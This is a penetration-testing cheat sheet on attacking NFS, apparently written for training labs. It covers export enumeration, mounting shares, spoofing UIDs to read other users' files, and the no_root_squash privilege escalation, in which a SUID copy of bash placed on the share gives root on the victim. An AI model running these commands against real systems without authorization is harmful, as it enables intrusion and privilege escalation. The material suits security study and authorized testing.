# NFS (Network File System)
**Default Ports:** 111 (RPCBind), 2049 (NFS) 
**Key Insight:** NFS trusts the _client's_ UID. If you create a local user with the same UID as a file owner on the share, you can read/write that file.
## 1. Discovery & Enumeration
**Goal:** List available exports (shares) and check permissions.
### Showmount (The Gold Standard)
**Description:** Queries the RPCBind service to list exports. 
**Syntax:** `showmount -e <IP>`
```shell
# List Exports
# ⚠️ OPSEC: Low Noise.
showmount -e 10.129.2.15

# Output Example:
# /var/www/html   * (Everyone can mount)
# /home/backup    10.129.2.5  (Only specific IP can mount)
```
### Nmap (Automated)
**Description:** Runs scripts to list exports and check for vulnerabilities.
```shell
# Run NFS-specific scripts
nmap -p 111,2049 --script nfs* 10.129.2.15
```
## 2. Mounting Shares
**Goal:** Mount the remote share to your local filesystem to access files.
### Preparation
```shell
# Create a local mount point
sudo mkdir -p /mnt/target_nfs
```
### Mounting Commands
**Syntax:** `mount -t nfs <IP>:<Remote_Share> <Local_Mount_Point> -o <Options>`
```shell
# Standard Mount (Try this first)
# -o nolock: Required for older servers or if locking port is filtered.
sudo mount -t nfs 10.129.2.15:/var/www /mnt/target_nfs -o nolock

# Force Version 2 (Legacy)
# Use if connection hangs or fails.
sudo mount -t nfs -o vers=2 10.129.2.15:/backup /mnt/target_nfs

# Unmounting (Cleanup)
# -f: Force | -l: Lazy (if share is stuck)
sudo umount -f -l /mnt/target_nfs
```
## 3. Permissions Analysis (UID/GID Spoofing)
**Concept:** NFS trusts the UID sent by the client. 
**Scenario:** You see a file owned by UID `1005` but cannot read it. 
**Attack:** Create a local user with UID `1005`, `su` to that user, and you can read the file.
```shell
# 1. List files with Numeric UIDs (-n)
ls -n /mnt/target_nfs

# 2. Check current user UID
id

# 3. Create a matching user (if needed)
sudo useradd -u 1005 target_user
sudo su target_user
cat /mnt/target_nfs/secret_file
```
## 4. Exploitation: Root Squashing (PrivEsc)
**Vulnerability:** If the export has `no_root_squash` enabled, files created by `root` on your machine will be owned by `root` on the target. 
**Goal:** Create a SUID shell to become root on the target.
### Check for Vulnerability
```shell
# As root on Kali:
touch /mnt/target_nfs/test_root
ls -l /mnt/target_nfs/test_root

# Vulnerable: Owner is 'root' (UID 0).
# Secure: Owner is 'nfsnobody' (UID 65534).
```
### The SUID Bash Attack
**Context:** You have write access to the share AND shell access on the target (as a low-priv user).
```shell
# 1. On Kali (As Root): Copy bash to the share
cp /bin/bash /mnt/target_nfs/root_bash

# 2. On Kali: Give it SUID permissions (+s)
chmod +s /mnt/target_nfs/root_bash

# 3. On Victim Machine (Low Priv Shell): Execute it
# -p: Preserves permissions (runs as owner, which is root)
/var/www/root_bash -p
# Result: root@victim:~#
```
## 5. Post-Exploitation (Config)
**Context:** You are root on the target.
```shell
# Main Config File (Exports)
# Look for 'no_root_squash' or insecure IP ranges.
cat /etc/exports
```